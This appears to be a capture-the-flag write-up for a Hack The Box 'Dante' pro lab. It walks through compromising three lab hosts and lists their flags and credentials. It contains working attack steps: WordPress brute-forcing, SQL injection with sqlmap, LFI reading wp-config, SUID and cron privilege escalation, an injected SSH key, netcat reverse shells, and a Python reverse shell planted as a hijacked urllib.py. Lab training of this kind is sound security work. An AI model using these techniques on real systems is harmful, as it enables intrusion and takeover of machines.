@@ -1,0 +1,494 @@
+## This is writup for Dante pro Labs 
+
+### my target network is 
+
+```
+10.10.110.0/24
+10.10.110.100 == DANTE-WEB-NIX01 pwned !!
+172.16.1.13 == DANTE-WS01 pwned !!
+172.16.1.10 == DANTE-NIX02 pwned !!
+---------------------------------
+
+
+
+```
+
+
+#### first scan of the network revilas 
+
+```
+10.10.110.2
+
+All 1000 scanned ports on 10.10.110.2 are filtered
+
+
+
+10.10.110.100
+
+Nmap scan report for 10.10.110.100
+Host is up (0.12s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+65000/tcp open  unknown
+
+
+
+```
+
+
+# scaning the first target 10.10.110.100 
+
+```
+---------------------Starting Nmap Basic Scan---------------------
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 21:48 EDT
+Nmap scan report for 10.10.110.100
+Host is up (0.087s latency).
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.20
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/wordpress DANTE{Y0u_Cant_G3t_@_M3_Br0!}
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
+
+```
+
+## first flag 
+```
+DANTE{Y0u_Cant_G3t_@_M3_Br0!}
+
+```
+
+
+## login ftp as anonymous 
+
+
+```
+found file in 257 "/Transfer/Incoming" 
+todo.txt 
+```
+
+
+## todo.txt 
+
+```
+\- Finalize Wordpress permission changes - PENDING
+- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
+- Remove LFI vuln from the other site - PENDING
+- Reset James' password to something more secure - PENDING
+- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
+
+
+i can know here 1 user James  <- already added to users.txt at creds-network 
+
+```
+
+# move to the website at 65000 
+
+
+## found 2 users and creds for wordpress using wpscan and cwel on the website :D  
+
+```
+[+] Performing password attack on Wp Login against 2 user/s
+[SUCCESS] - james / Toyota                                                                                                                                                              
+Trying admin / Author Time: 00:16:19 <======================================================================                                        > (894 / 1388) 64.40%  ETA:
+
+[!] Valid Combinations Found:
+
+ | Username: james, Password: Toyota
+
+tried the creds with ftp and all works good 
+
+
+```
+
+
+##  ftp access to james/home i can see .bash_history that coniant something :D 
+
+## second flag
+```
+DANTE{J4m3s_N33d5_@_p455w0rd_M4n4ger!}
+```
+
+```
+
+root@kali:~/Desktop/Dante/10.10.110.100/solve# cat .bash_history 
+cd /home/balthazar
+rm .mysql_history
+mysql -u balthazar -p TheJoker12345!
+
+
+got new user and pass <- already added to the creds S
+
+now i got ssh session with this user :D 
+
+```
+
+
+## ssh session
+
+```
+
+balthazar@DANTE-WEB-NIX01:~$
+
+
+[!] fst020 Uncommon setuid binaries........................................ yes!
+---
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/find
+---
+
+we got find so lets get root :D
+
+```
+
+
+# root shell 
+
+```
+balthazar@DANTE-WEB-NIX01:~$ find . -exec /bin/sh -p \; -quit
+ id
+uid=1002(balthazar) gid=1002(balthazar) euid=0(root) groups=1002(balthazar)
+ ls
+Desktop  Documents  Downloads  lse.sh  Music  Pictures	Public	Templates  test  Videos
+ cd /root
+ ls
+flag.txt  wordpress_backup
+ cat flag.txt
+DANTE{t00_Much_Pr1v}
+ 
+```
+
+## thrid flag 
+
+```
+DANTE{t00_Much_Pr1v}
+```
+
+
+## to get ssh session with root prrivilges 
+
+```
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuPkSis2UO5OLZQwQyi9fnbN6BT9zRfd5IgI+MKeOOxU2bcj6vonXUz9feqIvRO+3+ez7edvyWatN/W3KxaYYZh6Ui2WlGIhaRE3ag5P0jo3nzv7YrLxYXzU0jReBpmR5q+R+udSpbyxw3CCWUk23thAEHJJ3rbhFgfWr3yP4zi2WnIDaoxocPCM7To0jyq6jkSB3BcSmGixaC/f73ORZ57TY74ijx/OAbR4oDLrh1HhkPrbeF6D9PUX/SQ3+TfBj8rmALv6n5dkNPpHzYlZXPz8sCAThJTwNG6JogaNq5OnlWKOP1Kh9tfiHNWDhRpwEhjBcFg3NwvqUgfgBsfXMY6LKzFy6HrMaR+/FZaDJ4Qd7FsjBd23R5Y30CyeAuAERf6He15eD/wmWj9o6rOofsavJdAUq7L0BU3lT+JutQTPQqj3DZGCPYuUw3N3N0LOxqjeTBbgkpGRBWP4ZYtgpS32MiuQxoEbnpMoiMR5/8O6Bc3iDc4bmjxRauo+T0JqU= root@kali" >> /root/.ssh/authorized_keys
+
+
+now i can sign in with my id_rsa :D 
+
+
+root@kali:~/Desktop/Dante/DANTE-WEB-NIX01/solve# ssh root@10.10.110.100 -i id_rsa 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-29-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+286 updates can be installed immediately.
+67 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Wed Jul 29 22:38:02 2020 from 10.10.14.3
+root@DANTE-WEB-NIX01:~# 
+
+
+
+
+
+```
+
+
+# Acess the internal network using sshuttle 
+
+
+```
+ sshuttle -vr root@10.10.110.100 172.16.1.0/24 --ssh-cmd "ssh -i ./id_rsa"
+
+
+thanks for https://anubissec.github.io/How-To-Pivot-Into-Target-Network-With-SSH/#
+
+```
+
+
+## nmap the internal network gives us 1 host 
+
+
+```
+root@kali:~/Desktop/Dante/DANTE-WEB-NIX01/solve# nmap 172.16.1.0-255
+
+Stats: 0:00:47 elapsed; 255 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 54.00% done; ETC: 16:29 (0:00:11 remaining)
+Stats: 0:00:47 elapsed; 255 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 57.00% done; ETC: 16:29 (0:00:11 remaining)
+Nmap scan report for 172.16.1.110
+Host is up (0.034s latency).
+All 1000 scanned ports on 172.16.1.110 are filtered
+
+```
+
+
+## nmap cant scan well when we use pivoting so lets write script to nc all ports with success print 
+```
+
+for ip in $(cat ips); do
+        nc -zv -w1 $ip  1-65000 2>&1 | grep "succeeded!" 
+
+done
+
+ips is generated useing ips.py
+
+
+
+ip = "172.16.1."
+
+
+for i in range(0,255):
+	print(ip+str(i))
+
+```
+
+## nc script is so slow so i tried ping sweep on the web server 
+
+```
+
+root@DANTE-WEB-NIX01:~# for i in {1..254} ;do (ping -c 1 172.16.1.$i | grep "bytes from" &) ;done
+64 bytes from 172.16.1.5: icmp_seq=1 ttl=128 time=0.284 ms
+64 bytes from 172.16.1.10: icmp_seq=1 ttl=64 time=0.443 ms
+64 bytes from 172.16.1.12: icmp_seq=1 ttl=64 time=0.314 ms
+64 bytes from 172.16.1.13: icmp_seq=1 ttl=128 time=0.231 ms
+64 bytes from 172.16.1.17: icmp_seq=1 ttl=64 time=0.230 ms
+64 bytes from 172.16.1.19: icmp_seq=1 ttl=64 time=0.184 ms
+64 bytes from 172.16.1.20: icmp_seq=1 ttl=128 time=0.375 ms
+64 bytes from 172.16.1.100: icmp_seq=1 ttl=64 time=0.014 ms
+64 bytes from 172.16.1.101: icmp_seq=1 ttl=128 time=0.354 ms
+64 bytes from 172.16.1.102: icmp_seq=1 ttl=128 time=0.324 ms
+64 bytes from 172.16.1.155: icmp_seq=1 ttl=64 time=0.263 ms
+64 bytes from 172.16.1.156: icmp_seq=1 ttl=64 time=0.209 ms
+
+```
+
+
+
+
+# i used filezilla on box $ip.10 on ftp port and i get so far flag 
+
+```
+DANTE{S34rCh_f4r_&_W1d3!} -_- 
+
+```
+
+
+## i started with enumration of web site of $ip.13 
+```
+i found entrestid dir when i was bruteforcing http://172.16.1.13/discuss/index.php
+
+i got like login bage so i tried some of basics sql injection with no success , after that i move to sqlmap and it works :D 
+
+
+OST parameter 'uid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 79 HTTP(s) requests:
+---
+Parameter: uid (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uid=sss' AND (SELECT 4407 FROM (SELECT(SLEEP(5)))PzIo) AND 'ZRmM'='ZRmM&pwd=sss
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: uid=sss' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b7871,0x7165557365745964424c50687a774751784678555041544e48616c417a4174764d546462675a786a,0x716b767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vsOH&pwd=sss
+---
+[17:04:59] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.43, PHP, PHP 7.4.7
+back-end DBMS: MySQL >= 5.0.12
+[17:04:59] [INFO] fetched data logged to text files under '/root/.sqlmap/output/172.16.1.13'
+[17:04:59] [WARNING] you haven't updated sqlmap for more than 321 days!!!
+
+[*] ending @ 17:04:59 /2020-09-17/
+
+
+
+
+1 - bd name is "current database: 'tech_forum'" now fetching tables :D 
+
+2 - Database: tech_forum                                                                                                                                                                   
+[7 tables]
++------------+
+| user       |
+| answer     |
+| chat       |
+| chatmaster |
+| question   |
+| subtopic   |
+| topic      |
++------------+
+
+3 - users seems intrested lets dump it :D 
+
+
+
+4 - i can get shell - > dante-ws01\gerald
+
+```
+
+## to explain how i get shell on dante-ws01 
+```
+first i used shell os-command of sqlmap 
+
+then i uploaded nc.exe to webserver that i controlled already 
+
+i do nc -lnvp 443 on web server and execute  nc.exe 172.16.1.100 443 -e cmd.exe 
+
+and i got gerald intrractive shell :D got flag.txt 
+
+DANTE{L15t3n_t0_Wh4t_th3y_h4ve_2_S4Y}
+
+```
+
+## after fuckk tun of time i find vulnarable program installed on gerald box named Druva 
+
+```
+
+i edited the code multible time , and take team viewer connection on windows box , tested the prof multible times and build it 
+
+
+
+
+after that i transferd the druva-fix.exe to the gerald box and execute 
+
+C:\Users\gerald\Downloads>druva-fix.exe "windows\system32\cmd.exe /C C:\xampp\htdocs\nc.exe 172.16.1.100 1337 -e cmd.exe"
+druva-fix.exe "windows\system32\cmd.exe /C C:\xampp\htdocs\nc.exe 172.16.1.100 1337 -e cmd.exe"
+b'inSync PHC RPCW[v0002]'
+b'\x05\x00\x00\x00'
+b'\x08\x01\x00\x00'
+b'C\x00:\x00\\\x00P\x00r\x00o\x00g\x00r\x00a\x00m\x00D\x00a\x00t\x00a\x00\\\x00D\x00r\x00u\x00v\x00a\x00\\\x00i\x00n\x00S\x00y\x00n\x00c\x004\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00.\x00.\x00\\\x00w\x00i\x00n\x00d\x00o\x00w\x00s\x00\\\x00s\x00y\x00s\x00t\x00e\x00m\x003\x002\x00\\\x00c\x00m\x00d\x00.\x00e\x00x\x00e\x00 \x00/\x00C\x00 \x00C\x00:\x00\\\x00x\x00a\x00m\x00p\x00p\x00\\\x00h\x00t\x00d\x00o\x00c\x00s\x00\\\x00n\x00c\x00.\x00e\x00x\x00e\x00 \x001\x007\x002\x00.\x001\x006\x00.\x001\x00.\x001\x000\x000\x00 \x001\x003\x003\x007\x00 \x00-\x00e\x00 \x00c\x00m\x00d\x00.\x00e\x00x\x00e\x00'
+Done.
+
+then i got my adminstrator shell on the foothold box :D 
+
+root@DANTE-WEB-NIX01:~/.local/share/nano# nc -lnvp 1337
+Listening on 0.0.0.0 1337
+Connection received on 172.16.1.13 49740
+Microsoft Windows [Version 10.0.18363.900]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+```
+
+
+
+# moving to 172.16.1.10 
+
+```
+
+after opening website i got parameter that includes web pages 
+
+bascilly i tried http://172.16.1.10/nav.php?page=../../../../../../../../../../etc/passwd
+
+it worked :D 
+
+root:x:0:0:root:/root:/bin/bash
+frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
+
+no useful data working around the known files 
+
+get this message from smb with fuckking "/"
+
+-Remove wordpress install from web root - PENDING
+-Reinstate Slack integration on Ubuntu machine - PENDING
+-Remove old employee accounts - COMPLETE
+-Inform Margaret of the new changes - COMPLETE
+-Remove account restrictions on Margarets account post-promotion to admin - PENDING
+
+
+so we know there is wordpress and the best file to view is wp-config :D 
+
+http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
+
+we got creds works on ssh :D 
+
+/** MySQL database username */
+define( 'DB_USER', 'margaret' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'STARS5678FORTUNE401' );
+
+lets escape the shell 
+
+
+finally the escap was using vim 
+
+:set shell=/bin/bash
+
+shell
+
+
+now privesc to frank 
+
+i have zip file on frank download dir , i cant read some of content of the file 
+
+i moved it locally and i opend secure messages and i got his password 
+
+I also set you a new password on the Ubuntu box - ```69F15HST1CX```, same username
+
+after using pspy shell i see that apacche_restart running py cronjob from root so i decided to hijacck libararies 
+
+with the same dir of the python code , i can read it the code call urllib library 
+
+nano urllib.py
+
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.10.14.10', 1337))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(['/bin/sh', '-i'])
+
+
+
+i got root shell :D 
+
+
+root@kali:~/Desktop/Dante/172.16.1.10# nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.110.3] 33573
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+DANTE{L0v3_m3_S0m3_H1J4CK1NG!!}
+
+```
